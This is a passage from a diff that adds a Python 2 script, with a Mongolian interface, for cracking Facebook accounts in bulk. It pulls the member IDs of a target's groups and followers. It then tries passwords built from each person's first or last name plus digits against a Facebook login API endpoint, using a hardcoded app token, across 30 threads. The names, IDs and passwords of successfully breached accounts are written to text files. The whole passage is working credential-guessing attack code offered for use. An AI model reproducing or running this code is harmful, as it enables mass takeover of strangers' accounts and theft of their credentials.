+								print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Нууц үг  \x1b[1;91m> \x1b[1;92m") + bos3
+								oke = open("done/grup.txt", "a")
+								oke.write("\n{×} Амжилттай \n{×} Нэр     > " +j['name']+ "\n{×} АяДи     > " +zowe+ "\n{×} Нууц үг > " +bos3+"\n")
+								oke.close()
+								oks.append(zowe)
+							else:
+								if 'www.facebook.com' in ko['error_msg']:
+									print ("\n\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} \x1b[1;96mЦООЖТОЙ")
+									print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Нэр  \x1b[1;91m    > \x1b[1;96m") + j['name']
+									print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} АяДи  \x1b[1;91m   > \x1b[1;96m") + zowe
+									print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Нууц үг  \x1b[1;91m> \x1b[1;96m") + bos3
+									cek = open("done/grup.txt", "a")
+									cek.write("\n{×} Цоожтой \n{×} Нэр     > " +j['name']+ "\n{×} АяДи     > " +zowe+ "\n{×} Нууц үг > " +bos3+"\n")
+									cek.close()
+									cekpoint.append(zowe)
+								else:
+									bos4 = j['last_name'].lower()+'123'
+									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+									ko = json.load(data)
+									if 'access_token' in ko:
+										print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mАмжилттай")
+										print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Нэр  \x1b[1;91m    > \x1b[1;92m") + j['name']
+										print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} АяДи  \x1b[1;91m   > \x1b[1;92m") + zowe
+										print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Нууц үг  \x1b[1;91m> \x1b[1;92m") + bos4
+										oke = open("done/grup.txt", "a")
+										oke.write("\n{×} Амжилттай \n{×} Нэр     > " +j['name']+ "\n{×} АяДи     > " +zowe+ "\n{×} Нууц үг > " +bos4+"\n")
+										oke.close()
+										oks.append(zowe)
+									else:
+										if 'www.facebook.com' in ko['error_msg']:
+											print ("\n\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} \x1b[1;96mЦООЖТОЙ")
+											print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Нэр  \x1b[1;91m    > \x1b[1;96m") + j['name']
+											print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} АяДи  \x1b[1;91m   > \x1b[1;96m") + zowe
+											print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Нууц үг  \x1b[1;91m> \x1b[1;96m") + bos4
+											cek = open("done/grup.txt", "a")
+											cek.write("\n{×} Цоожтой \n{×} Нэр     > " +j['name']+ "\n{×} АяДи     > " +zowe+ "\n{×} Нууц үг > " +bos4+"\n")
+											cek.close()
+											cekpoint.append(zowe)
+										else:
+											bos5 = j['last_name'].lower()+'1234'
+											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+											ko = json.load(data)
+											if 'access_token' in ko:
+												print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mАмжилттай")
+												print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Нэр  \x1b[1;91m    > \x1b[1;92m") + j['name']
+												print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} АяДи  \x1b[1;91m   > \x1b[1;92m") + zowe
+												print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Нууц үг  \x1b[1;91m> \x1b[1;92m") + bos5
+												oke = open("done/grup.txt", "a")
+												oke.write("\n{×} Амжилттай \n{×} Нэр     > " +j['name']+ "\n{×} АяДи     > " +zowe+ "\n{×} Нууц үг > " +bos5+"\n")
+												oke.close()
+												oks.append(zowe)
+											else:
+												if 'www.facebook.com' in ko['error_msg']:
+													print ("\n\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} \x1b[1;96mЦООЖТОЙ")
+													print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Нэр  \x1b[1;91m    > \x1b[1;96m") + j['name']
+													print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} АяДи  \x1b[1;91m   > \x1b[1;96m") + zowe
+													print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Нууц үг  \x1b[1;91m> \x1b[1;96m") + bos5
+													cek = open("done/grup.txt", "a")
+													cek.write("\n{×} Цоожтой \n{×} Нэр     > " +j['name']+ "\n{×} АяДи     > " +zowe+ "\n{×} Нууц үг > " +bos5+"\n")
+													cek.close()
+													cekpoint.append(zowe)
+												else:
+													bos6 = j['last_name'].lower()+'12345'
+													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+													ko = json.load(data)
+													if 'access_token' in ko:
+														print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mАмжилттай")
+														print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Нэр  \x1b[1;91m    > \x1b[1;92m") + j['name']
+														print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} АяДи  \x1b[1;91m   > \x1b[1;92m") + zowe
+														print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Нууц үг  \x1b[1;91m> \x1b[1;92m") + bos6
+														oke = open("done/grup.txt", "a")
+														oke.write("\n{×} Амжилттай \n{×} Нэр     > " +j['name']+ "\n{×} АяДи     > " +zowe+ "\n{×} Нууц үг > " +bos6+"\n")
+														oke.close()
+														oks.append(zowe)
+													else:
+														if 'www.facebook.com' in ko['error_msg']:
+															print ("\n\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} \x1b[1;96mЦООЖТОЙ")
+															print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Нэр  \x1b[1;91m    > \x1b[1;96m") + j['name']
+															print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} АяДи  \x1b[1;91m   > \x1b[1;96m") + zowe
+															print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Нууц үг  \x1b[1;91m> \x1b[1;96m") + bos6
+															cek = open("done/grup.txt", "a")
+															cek.write("\n{×} Цоожтой \n{×} Нэр     > " +j['name']+ "\n{×} АяДи     > " +zowe+ "\n{×} Нууц үг > " +bos6+"\n")
+															cek.close()
+															cekpoint.append(zowe)
+																			
+		except:
+			pass
+			
+	p = ThreadPool(30)
+	p.map(main, id)
+	print "\n\033[1;94m──────────────────────────────────────────────────"
+	print '\033[1;97m{\033[1;96m●\033[1;97m} \033[1;96mАмжилттай дууслаа ...'
+	print"\033[1;97m{\033[1;96m●\033[1;97m} \033[1;96mНийт \033[1;92mOK\033[1;97m/\x1b[1;96mCP \033[1;97m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;96m"+str(len(cekpoint))
+	print '\033[1;97m{\033[1;96m●\033[1;97m} \033[1;92mOK\033[1;97m/\x1b[1;96mCP \033[1;96mФайл Хадгалсан \033[1;91m: \033[1;92mdone/grup.txt'
+	print 50* "\033[1;94m─"
+	raw_input("\033[1;97m{<\033[1;96mБуцах\033[1;97m>}")
+	os.system("python2 kira.py")
+	
+##### CRACK FOLLOW #####
+def crack_follow():
+	toket=open('login.txt','r').read()
+	os.system('clear')
+	print logo
+	print 50* "\033[1;94m─"
+	print ("              \033[1;95m●●● \033[1;97mДагагчдаас \033[1;95m●●●")
+	print 50* "\033[1;94m─"
+	idt = raw_input("\033[1;97m{\033[1;95m●\033[1;97m} \033[1;95mID Хийнэ үү \033[1;91m:\033[1;92m ")
+	try:
+		jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
+		op = json.loads(jok.text)
+		print"\033[1;97m{\033[1;95m●\033[1;97m} \033[1;95mНэр \033[1;91m:\033[1;92m "+op["name"]
+	except KeyError:
+		print"\033[1;97m{\033[1;91m!\033[1;97m} Буруу ID  !"
+		raw_input("\n\033[1;95m[\033[1;97m<Буцах>\033[1;95m]")
+		menu()
+	except requests.exceptions.ConnectionError:
+		print"\033[1;97m{\033[1;91m!\033[1;97m} Интернэт холболтоо шалгана уу !"
+		keluar()
+	r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=999999&access_token="+toket)
+	z = json.loads(r.text)
+	for i in z['data']:
+		id.append(i['id'])
+		
+	print "\033[1;97m{\033[1;95m●\033[1;97m} \033[1;95mНийт ID Followers \033[1;91m:\033[1;92m "+str(len(id))
+	print('\033[1;97m{\033[1;95m●\033[1;97m} \033[1;95mЗогсоох бол CTRL+Z')
+	titik = ['.   ','..  ','... ']
+	for o in titik:
+		print("\r\033[1;97m{\033[1;95m●\033[1;97m} \033[1;95mАжиллаж байна"+o),;sys.stdout.flush();time.sleep(1)
+	print("\n\033[1;97m{\033[1;95m●\033[1;97m} \033[1;95mАжиллахгүй байвал Airplane mode асааж унтраана уу")
+	print ("\033[1;94m──────────────────────────────────────────────────")
+	
+##### MAIN FOLLOW #####
+	def main(arg):
+		sys.stdout.write("\r{}".format(datetime.now().strftime("\033[1;96m%H\033[1;91m:\033[1;93m%M\033[1;91m:\033[1;92m%S")));sys.stdout.flush()
+		global cekpoint,oks
+		zowe = arg
+		try:
+			os.mkdir('done')
+		except OSError:
+			pass
+		try:
+			an = requests.get('https://graph.facebook.com/'+zowe+'/?access_token='+toket)
+			j = json.loads(an.text)
+			bos1 = j['first_name'].title()+'123'
+			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+			ko = json.load(data)
+			if 'access_token' in ko:
+				print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mАмжилттай")
+				print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Нэр  \x1b[1;91m    > \x1b[1;92m") + j['name']
+				print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} АяДи  \x1b[1;91m   > \x1b[1;92m") + zowe
+				print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Нууц үг  \x1b[1;91m> \x1b[1;92m") + bos1
+				oke = open("done/follow.txt", "a")
+				oke.write("\n{×} Амжилттай \n{×} Нэр     > " +j['name']+ "\n{×} АяДи     > " +zowe+ "\n{×} Нууц үг > " +bos1+"\n")
+				oke.close()
+				oks.append(zowe)
+			else:
+				if 'www.facebook.com' in ko['error_msg']:
+					print ("\n\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} \x1b[1;95mЦООЖТОЙ")
+					print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} Нэр  \x1b[1;91m    > \x1b[1;95m") + j['name']
+					print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} АяДи  \x1b[1;91m   > \x1b[1;95m") + zowe
+					print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} Нууц үг  \x1b[1;91m> \x1b[1;95m") + bos1
+					cek = open("done/follow.txt", "a")
+					cek.write("\n{×} Цоожтой \n{×} Нэр     > " +j['name']+ "\n{×} АяДи     > " +zowe+ "\n{×} Нууц үг > " +bos1+"\n")
+					cek.close()
+					cekpoint.append(zowe)
+				else:
+					bos2 = j['first_name'].title()+'12345'
+					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+					ko = json.load(data)
+					if 'access_token' in ko:
+						print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mАмжилттай")
+						print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Нэр  \x1b[1;91m    > \x1b[1;92m") + j['name']
+						print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} АяДи  \x1b[1;91m   > \x1b[1;92m") + zowe
+						print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Нууц үг  \x1b[1;91m> \x1b[1;92m") + bos2
+						oke = open("done/follow.txt", "a")
+						oke.write("\n{×} Амжилттай \n{×} Нэр     > " +j['name']+ "\n{×} АяДи     > " +zowe+ "\n{×} Нууц үг > " +bos2+"\n")
+						oke.close()
+						oks.append(zowe)
+					else:
+						if 'www.facebook.com' in ko['error_msg']:
+							print ("\n\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} \x1b[1;95mЦООЖТОЙ")
+							print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} Нэр  \x1b[1;91m    > \x1b[1;95m") + j['name']
+							print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} АяДи  \x1b[1;91m   > \x1b[1;95m") + zowe
+							print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} Нууц үг  \x1b[1;91m> \x1b[1;95m") + bos2
+							cek = open("done/follow.txt", "a")
+							cek.write("\n{×} Цоожтой \n{×} Нэр     > " +j['name']+ "\n{×} АяДи     > " +zowe+ "\n{×} Нууц үг > " +bos2+"\n")
+							cek.close()
+							cekpoint.append(zowe)
+						else:
+							bos3 = j['last_name'].title()+'12345'
+							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+							ko = json.load(data)
+							if 'access_token' in ko:
+								print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mАмжилттай")
+								print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Нэр  \x1b[1;91m    > \x1b[1;92m") + j['name']
+								print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} АяДи  \x1b[1;91m   > \x1b[1;92m") + zowe
+								print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Нууц үг  \x1b[1;91m> \x1b[1;92m") + bos3
+								oke = open("done/follow.txt", "a")
+								oke.write("\n{×} Амжилттай \n{×} Нэр     > " +j['name']+ "\n{×} АяДи     > " +zowe+ "\n{×} Нууц үг > " +bos3+"\n")
+								oke.close()
+								oks.append(zowe)
+							else:
+								if 'www.facebook.com' in ko['error_msg']:
+									print ("\n\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} \x1b[1;95mЦООЖТОЙ")
+									print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} Нэр  \x1b[1;91m    > \x1b[1;95m") + j['name']
+									print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} АяДи  \x1b[1;91m   > \x1b[1;95m") + zowe
+									print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} Нууц үг  \x1b[1;91m> \x1b[1;95m") + bos3
+									cek = open("done/follow.txt", "a")
+									cek.write("\n{×} Цоожтой \n{×} Нэр     > " +j['name']+ "\n{×} АяДи     > " +zowe+ "\n{×} Нууц үг > " +bos3+"\n")
+									cek.close()
+									cekpoint.append(zowe)
+								else:
+									bos4 = j['last_name'].title()+'123'
+									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+									ko = json.load(data)
+									if 'access_token' in ko:
+										print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mАмжилттай")
+										print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Нэр  \x1b[1;91m    > \x1b[1;92m") + j['name']
+										print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} АяДи  \x1b[1;91m   > \x1b[1;92m") + zowe
+										print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Нууц үг  \x1b[1;91m> \x1b[1;92m") + bos4
+										oke = open("done/follow.txt", "a")
+										oke.write("\n{×} Амжилттай \n{×} Нэр     > " +j['name']+ "\n{×} АяДи     > " +zowe+ "\n{×} Нууц үг > " +bos4+"\n")
+										oke.close()
+										oks.append(zowe)
+																									
+		except:
+			pass
+			
+	p = ThreadPool(30)
+	p.map(main, id)
+	print "\n\033[1;94m──────────────────────────────────────────────────"
+	print '\033[1;97m{\033[1;95m●\033[1;97m} \033[1;95mАмжилттай дууслаа ...'
+	print"\033[1;97m{\033[1;95m●\033[1;97m} \033[1;95mНийт \033[1;92mOK\033[1;97m/\x1b[1;95mCP \033[1;97m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;95m"+str(len(cekpoint))
+	print '\033[1;97m{\033[1;95m●\033[1;97m} \033[1;92mOK\033[1;97m/\x1b[1;95mCP \033[1;95mФайл Хадгалсан\033[1;91m: \033[1;92mdone/follow.txt'
+	print 50* "\033[1;94m─"
+	raw_input("\033[1;97m{<\033[1;95mБуцах\033[1;97m>}")
+	os.system("python2 kira.py")
+	
+##### USERNAME ID ####
+def user_id():
+	os.system('clear')
+	print logo
+	print 50* "\033[1;94m─"
+	ling = ('https://www.facebook.com/')
+	url = ling+raw_input("\033[1;97m{\033[1;95m×\033[1;97m} Username : ")
+	idre = re.compile('"entity_id":"([0-9]+)"')
+	page = requests.get(url)
+	print idre.findall(page.content)
+	raw_input("\n\033[1;95m[\033[1;97m<Буцах>\033[1;95m]")
+	menu()
+	
+##### PERBARUI #####
+def perbarui():
+	os.system("clear")
+	print logo
+	print "\033[1;94m──────────────────────────────────────────────────"
+	jalan ("\033[1;92mБоломжгүй!! ...\033[1;93m")
+	os.system("!!!")
+	raw_input("\n\033[1;94m{\033[1;97m<Буцах>\033[1;94m}")
+	os.system("python2 kira.py")
+	
+if __name__=='__main__':
+	menu()
+	masuk()
